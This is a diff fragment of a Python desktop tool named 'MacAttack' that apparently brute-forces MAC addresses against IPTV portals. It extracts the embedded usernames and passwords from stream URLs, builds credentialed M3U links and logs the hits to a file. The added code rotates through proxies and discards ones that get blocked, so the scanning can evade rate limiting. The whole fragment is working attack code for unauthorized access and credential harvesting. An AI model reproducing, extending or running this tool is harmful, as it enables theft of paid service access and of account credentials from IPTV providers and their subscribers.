+                                res4 = s.get(url4, headers=headers, timeout=30, allow_redirects=False)
                                 data4 = json.loads(res4.text)
 
-                                # Extract the 'cmd' value and strip the 'ffmpeg ' prefix
                                 cmd_value4 = data4["js"]["cmd"].replace("ffmpeg ", "", 1)
                                 logging.debug(cmd_value4)
-                                
+
                                 parsed_url = urlparse(cmd_value4)
-
-                                # Extract domain and port
-
                                 domain_and_port = f"{parsed_url.scheme}://{parsed_url.hostname}:{parsed_url.port}" if parsed_url.port else f"{parsed_url.scheme}://{parsed_url.hostname}"
 
-
-                                
                                 logging.debug(f"Real Host: {domain_and_port}")
-                                
 
-                                # Split the path into parts
                                 path_parts = parsed_url.path.strip("/").split("/")
-
-                                # Check if there are at least two subdirectories
                                 m3ufound = 0
-                                if len(path_parts) >= 3: #3 slashes for the 2nd subdir /dir1/dir2/
+                                if len(path_parts) >= 3:
                                     username = path_parts[0]
                                     password = path_parts[1]
                                     logging.debug(f"Username: {username}")
@@ -1217,14 +1659,11 @@ class MacAttack(QMainWindow):
                                     logging.debug("Less than 2 subdirectories found in the path.")
                                     m3ufound = 0
 
-                                
-                                
-                                # Updated handling with type checks to avoid unexpected TypeErrors
                                 try:
                                     response_data = json.loads(res3.text)
                                     if isinstance(response_data, dict) and "js" in response_data and "data" in response_data["js"]:
                                         channels_data = response_data["js"]["data"]
-                                        count = len(channels_data)  # Count channels if data is valid
+                                        count = len(channels_data)
                                     else:
                                         self.update_error_text_signal.emit("Unexpected data structure for channels.")
                                         count = 0
@@ -1234,78 +1673,384 @@ class MacAttack(QMainWindow):
 
                             if count > 0:
                                 logging.debug("Mac found")
-              
-                                
-                                # Check if the autoloadmac_checkbox is checked
                                 if self.autoloadmac_checkbox.isChecked():
-                                    # Insert the base URL into the hostname_input field
-                                    self.hostname_input.setText(self.base_url)                                   
-                                    # Insert the mac value into the mac_input field
+                                    self.hostname_input.setText(self.base_url)
                                     self.mac_input.setText(mac)
 
                                 if self.output_file is None:
                                     output_filename = self.OutputMastermind()
-                                    self.output_file = open(output_filename, "a")                                        
-                                    
+                                    self.output_file = open(output_filename, "a")
+
                                 if m3ufound:
-
                                     result_message = (
-                                        f"{'Portal':<10} = {self.iptv_link}\n"
-                                        f"{'Real URL':<10} = {domain_and_port}\n"
-                                        f"{'MAC':<10} = {mac}\n"
-                                        f"{'Expiry':<10} = {expiry}\n"
-                                        f"{'Channels':<10} = {count}\n"
-                                        f"{'Username':<10} = {username}\n"
-                                        f"{'Password':<10} = {password}\n"
-                                        f"{'M3U':<10} = {domain_and_port}/get.php?username={username}&password={password}&type=m3u_plus\n"
+                                        f"{'Host:':<10} {self.iptv_link}\n"
+                                        f"{'Real URL:':<10} {domain_and_port}\n"
+                                        f"{'MAC:':<10} {mac}\n"
+                                        f"{'Expiry:':<10} {expiry}\n"
+                                        f"{'Channels:':<10} {count}\n"
+                                        f"{'M3U:':<10} {domain_and_port}/get.php?username={username}&password={password}&type=m3u_plus\n"
                                     )
 
-                                    self.update_output_text_signal.emit(result_message)  # Emit signal to update QTextEdit
-                                    
-                                    
-                                else: 
+                                    self.update_output_text_signal.emit(result_message)
+
+                                else:
                                     result_message = (
-                                        f"{'Portal':<10} = {self.iptv_link}\n"
-                                        f"{'MAC':<10} = {mac}\n"
-                                        f"{'Expiry':<10} = {expiry}\n"
-                                        f"{'Channels':<10} = {count}\n"
+                                        f"{'Portal:':<10} {self.iptv_link}\n"
+                                        f"{'MAC:':<10} {mac}\n"
+                                        f"{'Expiry:':<10} {expiry}\n"
+                                        f"{'Channels:':<10} {count}\n"
                                     )
-                                    self.update_output_text_signal.emit(result_message)  # Emit signal to update QTextEdit
-                                    
-                                # Write result_message to the output file
+                                    self.update_output_text_signal.emit(result_message)
+
                                 self.output_file.write(result_message)
-                                self.output_file.flush()  #Ensures data is written immediately
-                                
-                                
-                                
-
+                                self.output_file.flush()  # Ensures data is written immediately
                                 if self.successsound_checkbox.isChecked():
                                     sound_thread = threading.Thread(target=self.play_success_sound)
-                                    sound_thread.start()  # Start the background thread               
-                                
-                                
-                                
+                                    sound_thread.start()  # Start the background thread
+
                                 if self.autostop_checkbox.isChecked():
                                     logging.debug("autostop_checkbox is checked, stopping...")
-                                    self.stop_button.click()                             
+                                    self.stop_button.click()
                             else:
                                 result_message = f"MAC: {mac} connects, but has 0 channels. Bummer."
                                 self.update_error_text_signal.emit(result_message)
-                    else:
-                        self.update_error_text_signal.emit(f"No JSON response for MAC {mac}")
-
-            # Catch all relevant exceptions and ensure the loop continues
+                        else:
+                            #self.update_error_text_signal.emit(f"No JSON response for MAC {mac}")
+                            print(f"No JSON response for MAC {mac}")
             except (json.decoder.JSONDecodeError, requests.exceptions.RequestException, TypeError) as e:
-                if "Expecting value: line 1 column 1 (char 0)" in str(e):
-                    if self.error_count >= 6:
-                        self.update_error_text_signal.emit(
-                            f"Error for MAC: {mac} : {str(e).replace('Expecting value: line 1 column 1 (char 0)', '<b>Empty response</b>')}"
-                        )
-                    self.error_count += 1  # Increment the error count
-                else:
-                    if self.error_count >= 6: #skipping emitting the first 6 errors. Because, laziness.
-                        self.update_error_text_signal.emit(f"Error for MAC {mac}: {str(e)}")
-                    self.error_count += 1  # Increment the error count
+                # Now catch the error when res2 fails
+                if "Expecting value" in str(e):
+                    print("Raw Response Content:", res.text)  # Print raw response for debugging
+                    if "ERR_ACCESS_DENIED" in res.text:
+                        self.update_error_text_signal.emit(f"Error for Proxy: {selected_proxy} : <b>Access Denied</b> Proxy refused access.")
+                        # Track error count for the proxy
+                        if selected_proxy not in proxy_error_counts:
+                            proxy_error_counts[selected_proxy] = 1
+                        else:
+                            proxy_error_counts[selected_proxy] += 1
+
+                        # Remove the proxy if it exceeds the allowed error count
+                        error_limit = self.proxy_remove_errorcount.value()
+                        if error_limit > 0 and proxy_error_counts[selected_proxy] >= error_limit:
+                            # Ensure proxies is a list and remove the proxy from the list
+                            if isinstance(proxies, list):
+                                if selected_proxy in proxies:
+                                    proxies.remove(selected_proxy)
+
+                            # Remove the proxy from the error count dictionary
+                            del proxy_error_counts[selected_proxy]
+
+                            # Update the QTextEdit to remove the proxy
+                            current_text = self.proxy_textbox.toPlainText()
+                            # Remove the selected proxy from the text area
+                            new_text = "\n".join([line for line in current_text.splitlines() if line.strip() != selected_proxy])
+
+                            # Set the updated text back to the QTextEdit
+                            self.macattack_update_proxy_textbox_signal.emit(new_text)
+
+                            # Emit a signal to notify the user
+                            self.update_error_text_signal.emit(
+                                f"Proxy {selected_proxy} removed after exceeding {error_limit} connection errors."
+                            )
+                    elif "Could not connect" in res.text:
+                        self.update_error_text_signal.emit(f"Error for Proxy: {selected_proxy} : <b>Could not connect</b> proxy Could not connect")
+                        # Track error count for the proxy
+                        if selected_proxy not in proxy_error_counts:
+                            proxy_error_counts[selected_proxy] = 1
+                        else:
+                            proxy_error_counts[selected_proxy] += 1
+
+                        # Remove the proxy if it exceeds the allowed error count
+                        error_limit = self.proxy_remove_errorcount.value()
+                        if error_limit > 0 and proxy_error_counts[selected_proxy] >= error_limit:
+                            # Ensure proxies is a list and remove the proxy from the list
+                            if isinstance(proxies, list):
+                                if selected_proxy in proxies:
+                                    proxies.remove(selected_proxy)
+
+                            # Remove the proxy from the error count dictionary
+                            del proxy_error_counts[selected_proxy]
+
+                            # Update the QTextEdit to remove the proxy
+                            current_text = self.proxy_textbox.toPlainText()
+                            # Remove the selected proxy from the text area
+                            new_text = "\n".join([line for line in current_text.splitlines() if line.strip() != selected_proxy])
+
+                            # Set the updated text back to the QTextEdit
+                            self.macattack_update_proxy_textbox_signal.emit(new_text)
+
+                            # Emit a signal to notify the user
+                            self.update_error_text_signal.emit(
+                                f"Proxy {selected_proxy} removed after exceeding {error_limit} connection errors."
+                            )                    
+                    elif "Blocked" in res.text:
+                        self.update_error_text_signal.emit(f"Error for Proxy: {selected_proxy} : <b>Access Denied</b> proxy blocked access")
+                        # Track error count for the proxy
+                        if selected_proxy not in proxy_error_counts:
+                            proxy_error_counts[selected_proxy] = 1
+                        else:
+                            proxy_error_counts[selected_proxy] += 1
+
+                        # Remove the proxy if it exceeds the allowed error count
+                        error_limit = self.proxy_remove_errorcount.value()
+                        if error_limit > 0 and proxy_error_counts[selected_proxy] >= error_limit:
+                            # Ensure proxies is a list and remove the proxy from the list
+                            if isinstance(proxies, list):
+                                if selected_proxy in proxies:
+                                    proxies.remove(selected_proxy)
+
+                            # Remove the proxy from the error count dictionary
+                            del proxy_error_counts[selected_proxy]
+
+                            # Update the QTextEdit to remove the proxy
+                            current_text = self.proxy_textbox.toPlainText()
+                            # Remove the selected proxy from the text area
+                            new_text = "\n".join([line for line in current_text.splitlines() if line.strip() != selected_proxy])
+
+                            # Set the updated text back to the QTextEdit
+                            self.macattack_update_proxy_textbox_signal.emit(new_text)
+
+                            # Emit a signal to notify the user
+                            self.update_error_text_signal.emit(
+                                f"Proxy {selected_proxy} removed after exceeding {error_limit} connection errors."
+                            )
+                    elif "Access Denied" in res.text:
+                        self.update_error_text_signal.emit(f"Error for Proxy: {selected_proxy} : <b>Access Denied</b> proxy blocked access")
+                        # Track error count for the proxy
+                        if selected_proxy not in proxy_error_counts:
+                            proxy_error_counts[selected_proxy] = 1
+                        else:
+                            proxy_error_counts[selected_proxy] += 1
+
+                        # Remove the proxy if it exceeds the allowed error count
+                        error_limit = self.proxy_remove_errorcount.value()
+                        if error_limit > 0 and proxy_error_counts[selected_proxy] >= error_limit:
+                            # Ensure proxies is a list and remove the proxy from the list
+                            if isinstance(proxies, list):
+                                if selected_proxy in proxies:
+                                    proxies.remove(selected_proxy)
+
+                            # Remove the proxy from the error count dictionary
+                            del proxy_error_counts[selected_proxy]
+
+                            # Update the QTextEdit to remove the proxy
+                            current_text = self.proxy_textbox.toPlainText()
+                            # Remove the selected proxy from the text area
+                            new_text = "\n".join([line for line in current_text.splitlines() if line.strip() != selected_proxy])
+
+                            # Set the updated text back to the QTextEdit
+                            self.macattack_update_proxy_textbox_signal.emit(new_text)
+
+                            # Emit a signal to notify the user
+                            self.update_error_text_signal.emit(
+                                f"Proxy {selected_proxy} removed after exceeding {error_limit} connection errors."
+                            )
+
+                    elif "403 Forbidden" in res.text:
+                        self.update_error_text_signal.emit(f"Error for Proxy: {selected_proxy} : <b>403 Forbidden</b> proxy blocked access")
+                        # Track error count for the proxy
+                        if selected_proxy not in proxy_error_counts:
+                            proxy_error_counts[selected_proxy] = 1
+                        else:
+                            proxy_error_counts[selected_proxy] += 1
+
+                        # Remove the proxy if it exceeds the allowed error count
+                        error_limit = self.proxy_remove_errorcount.value()
+                        if error_limit > 0 and proxy_error_counts[selected_proxy] >= error_limit:
+                            # Ensure proxies is a list and remove the proxy from the list
+                            if isinstance(proxies, list):
+                                if selected_proxy in proxies:
+                                    proxies.remove(selected_proxy)
+
+                            # Remove the proxy from the error count dictionary
+                            del proxy_error_counts[selected_proxy]
+
+                            # Update the QTextEdit to remove the proxy
+                            current_text = self.proxy_textbox.toPlainText()
+                            # Remove the selected proxy from the text area
+                            new_text = "\n".join([line for line in current_text.splitlines() if line.strip() != selected_proxy])
+
+                            # Set the updated text back to the QTextEdit
+                            self.macattack_update_proxy_textbox_signal.emit(new_text)
+
+                            # Emit a signal to notify the user
+                            self.update_error_text_signal.emit(
+                                f"Proxy {selected_proxy} removed after exceeding {error_limit} connection errors."
+                            )
+                    elif "500 Internal Server Error" in res.text:
+                        self.update_error_text_signal.emit(f"Error for Proxy: {selected_proxy} : <b>500 Internal Server Error</b> proxy server issue")
+                        # Track error count for the proxy
+                        if selected_proxy not in proxy_error_counts:
+                            proxy_error_counts[selected_proxy] = 1
+                        else:
+                            proxy_error_counts[selected_proxy] += 1
+
+                        # Remove the proxy if it exceeds the allowed error count
+                        error_limit = self.proxy_remove_errorcount.value()
+                        if error_limit > 0 and proxy_error_counts[selected_proxy] >= error_limit:
+                            # Ensure proxies is a list and remove the proxy from the list
+                            if isinstance(proxies, list):
+                                if selected_proxy in proxies:
+                                    proxies.remove(selected_proxy)
+
+                            # Remove the proxy from the error count dictionary
+                            del proxy_error_counts[selected_proxy]
+
+                            # Update the QTextEdit to remove the proxy
+                            current_text = self.proxy_textbox.toPlainText()
+                            # Remove the selected proxy from the text area
+                            new_text = "\n".join([line for line in current_text.splitlines() if line.strip() != selected_proxy])
+
+                            # Set the updated text back to the QTextEdit
+                            self.macattack_update_proxy_textbox_signal.emit(new_text)
+
+                            # Emit a signal to notify the user
+                            self.update_error_text_signal.emit(
+                                f"Proxy {selected_proxy} removed after exceeding {error_limit} connection errors."
+                            )
+                    elif "Host header port mismatch" in res.text:
+                        self.update_error_text_signal.emit(f"Error for Proxy: {selected_proxy} : <b>Host header port mismatch</b> proxy port does not match")
+                        # Track error count for the proxy
+                        if selected_proxy not in proxy_error_counts:
+                            proxy_error_counts[selected_proxy] = 1
+                        else:
+                            proxy_error_counts[selected_proxy] += 1
+
+                        # Remove the proxy if it exceeds the allowed error count
+                        error_limit = self.proxy_remove_errorcount.value()
+                        if error_limit > 0 and proxy_error_counts[selected_proxy] >= error_limit:
+                            # Ensure proxies is a list and remove the proxy from the list
+                            if isinstance(proxies, list):
+                                if selected_proxy in proxies:
+                                    proxies.remove(selected_proxy)
+
+                            # Remove the proxy from the error count dictionary
+                            del proxy_error_counts[selected_proxy]
+
+                            # Update the QTextEdit to remove the proxy
+                            current_text = self.proxy_textbox.toPlainText()
+                            # Remove the selected proxy from the text area
+                            new_text = "\n".join([line for line in current_text.splitlines() if line.strip() != selected_proxy])
+
+                            # Set the updated text back to the QTextEdit
+                            self.macattack_update_proxy_textbox_signal.emit(new_text)
+
+                            # Emit a signal to notify the user
+                            self.update_error_text_signal.emit(
+                                f"Proxy {selected_proxy} removed after exceeding {error_limit} connection errors."
+                            )
+                    elif "connections reached" in res.text:
+                        self.update_error_text_signal.emit(f"Error for Proxy: {selected_proxy} : <b>Proxy Overloaded</b> Maximum number of open connections reached.")
+                    elif "502 Bad Gateway" in res.text:
+                        self.update_error_text_signal.emit(f"Error for Proxy: {selected_proxy} : <b>502 Bad Gateway</b> DNS Issue with proxy")
+                        # Track error count for the proxy
+                        if selected_proxy not in proxy_error_counts:
+                            proxy_error_counts[selected_proxy] = 1
+                        else:
+                            proxy_error_counts[selected_proxy] += 1
+
+                        # Remove the proxy if it exceeds the allowed error count
+                        error_limit = self.proxy_remove_errorcount.value()
+                        if error_limit > 0 and proxy_error_counts[selected_proxy] >= error_limit:
+                            # Ensure proxies is a list and remove the proxy from the list
+                            if isinstance(proxies, list):
+                                if selected_proxy in proxies:
+                                    proxies.remove(selected_proxy)
+
+                            # Remove the proxy from the error count dictionary
+                            del proxy_error_counts[selected_proxy]
+
+                            # Update the QTextEdit to remove the proxy
+                            current_text = self.proxy_textbox.toPlainText()
+                            # Remove the selected proxy from the text area
+                            new_text = "\n".join([line for line in current_text.splitlines() if line.strip() != selected_proxy])
+
+                            # Set the updated text back to the QTextEdit
+                            self.macattack_update_proxy_textbox_signal.emit(new_text)
+
+                            # Emit a signal to notify the user
+                            self.update_error_text_signal.emit(
+                                f"Proxy {selected_proxy} removed after exceeding {error_limit} connection errors."
+                            )
+                    elif "no such host" in res.text:
+                        self.update_error_text_signal.emit(f"Error for Portal: {selected_proxy} : <b>Portal not found</b> invalid IPTV link")
+                    elif "ERROR: Not Found" in res.text:
+                        self.update_error_text_signal.emit(f"Error for Portal: {selected_proxy} : <b>Portal not found</b> invalid IPTV link")
+                    elif "503 Service Temporarily Unavailable" in res.text:
+                        if self.error_count >= 15:
+                            self.update_error_text_signal.emit(f"Error for Portal: <b>503 Service Temporarily Unavailable</b>")
+                    #if self.error_count >= 6:
+                        #self.update_error_text_signal.emit(f"Error for MAC: {mac} : <b>{str(e).replace('Expecting value: line 1 column 1 (char 0)', 'Empty response')}</b>")
+                    
+
+                    elif "Max retries exceeded" in str(e):
+                        self.update_error_text_signal.emit(f"Error for Proxy: {selected_proxy} : <b>Not connecting</b> Proxy offline")
+
+                        # Track error count for the proxy
+                        if selected_proxy not in proxy_error_counts:
+                            proxy_error_counts[selected_proxy] = 1
+                        else:
+                            proxy_error_counts[selected_proxy] += 1
+
+                        # Remove the proxy if it exceeds the allowed error count
+                        error_limit = self.proxy_remove_errorcount.value()
+                        if error_limit > 0 and proxy_error_counts[selected_proxy] >= error_limit:
+                            # Ensure proxies is a list and remove the proxy from the list
+                            if isinstance(proxies, list):
+                                if selected_proxy in proxies:
+                                    proxies.remove(selected_proxy)
+
+                            # Remove the proxy from the error count dictionary
+                            del proxy_error_counts[selected_proxy]
+
+                            # Update the QTextEdit to remove the proxy
+                            current_text = self.proxy_textbox.toPlainText()
+                            # Remove the selected proxy from the text area
+                            new_text = "\n".join([line for line in current_text.splitlines() if line.strip() != selected_proxy])
+
+                            # Set the updated text back to the QTextEdit
+                            self.macattack_update_proxy_textbox_signal.emit(new_text)
+
+                            # Emit a signal to notify the user
+                            self.update_error_text_signal.emit(
+                                f"Proxy {selected_proxy} removed after exceeding {error_limit} connection errors."
+                            )
+                    elif "Read timed out" in str(e):
+                        self.update_error_text_signal.emit(f"Error for Proxy: {selected_proxy} : <b>Timed out</b>")
+                        # Track error count for the proxy
+                        if selected_proxy not in proxy_error_counts:
+                            proxy_error_counts[selected_proxy] = 1
+                        else:
+                            proxy_error_counts[selected_proxy] += 1
+
+                        # Remove the proxy if it exceeds the allowed error count
+                        error_limit = self.proxy_remove_errorcount.value()
+                        if error_limit > 0 and proxy_error_counts[selected_proxy] >= error_limit:
+                            # Ensure proxies is a list and remove the proxy from the list
+                            if isinstance(proxies, list):
+                                if selected_proxy in proxies:
+                                    proxies.remove(selected_proxy)
+
+                            # Remove the proxy from the error count dictionary
+                            del proxy_error_counts[selected_proxy]
+
+                            # Update the QTextEdit to remove the proxy
+                            current_text = self.proxy_textbox.toPlainText()
+                            # Remove the selected proxy from the text area
+                            new_text = "\n".join([line for line in current_text.splitlines() if line.strip() != selected_proxy])
+
+                            # Set the updated text back to the QTextEdit
+                            self.macattack_update_proxy_textbox_signal.emit(new_text)
+
+                            # Emit a signal to notify the user
+                            self.update_error_text_signal.emit(
+                                f"Proxy {selected_proxy} removed after exceeding {error_limit} connection errors."
+                            )
+                    else:
+                        if self.error_count >= 6:
+                            #self.update_error_text_signal.emit(f"Error for MAC {mac}: {str(e)}")
+                            print (f"{str(e)}")
+                    self.error_count += 1
                      
 
     def play_success_sound(self):
@@ -1649,7 +2394,7 @@ class MacAttack(QMainWindow):
 
                     while True:
                         response = session.get(
-                            seasons_url, cookies=cookies, headers=headers, timeout=10
+                            seasons_url, cookies=cookies, headers=headers, timeout=20
                         )
                         logging.debug(f"Seasons response: {response.text}")
                         if response.status_code == 200:
@@ -1774,7 +2519,7 @@ class MacAttack(QMainWindow):
                         create_link_url = f"{url}/portal.php?type=itv&action=create_link&cmd={cmd_encoded}&JsHttpRequest=1-xml"
                         logging.info(f"Create link URL: {create_link_url}")
                         response = session.get(
-                            create_link_url, cookies=cookies, headers=headers, timeout=10
+                            create_link_url, cookies=cookies, headers=headers, timeout=20
                         )
                         response.raise_for_status()
                         json_response = response.json()
@@ -1834,7 +2579,7 @@ class MacAttack(QMainWindow):
                         create_link_url = f"{url}/portal.php?type=vod&action=create_link&cmd={cmd_encoded}&JsHttpRequest=1-xml"
                     logging.debug(f"Create link URL: {create_link_url}")
                     response = session.get(
-                        create_link_url, cookies=cookies, headers=headers, timeout=10
+                        create_link_url, cookies=cookies, headers=headers, timeout=20
                     )
                     response.raise_for_status()
                     json_response = response.json()
